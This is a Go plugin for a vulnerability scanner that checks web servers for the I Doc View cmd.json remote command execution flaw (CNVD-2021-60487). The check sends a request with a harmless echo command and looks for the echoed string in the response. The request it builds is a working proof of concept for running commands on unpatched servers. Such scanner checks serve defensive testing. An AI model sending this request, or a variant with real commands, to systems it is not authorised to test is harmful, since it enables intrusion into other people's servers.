package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("idocview_cmd_rce", &idocview_cmd_rce{})
}

type idocview_cmd_rce struct{}

func (p *idocview_cmd_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "I Doc View cmd.json命令执行漏洞",
		VulnInfo: "I Doc View在线文档预览系统是一套用于在Web环境中展示和预览各种文档类型的系统。I Doc View 在线文档预览系统cmd.json接口处存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码。",
		VulnID:   "CNVD-2021-60487",
		Level:    "HIGH",
		URL:      "",
		Version:  "iDocView < 13.10.1_20231115",
		CWE:      "",
	}
}

func (p *idocview_cmd_rce) Check(netloc string) bool {
	rand := utils.GenRandom(10)
	payload := "?cmd=echo%20" + rand
	req, err := http.NewRequest("GET", netloc+"/system/cmd.json"+payload, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, ">"+rand+"<") {
		return true
	}
	return false
}
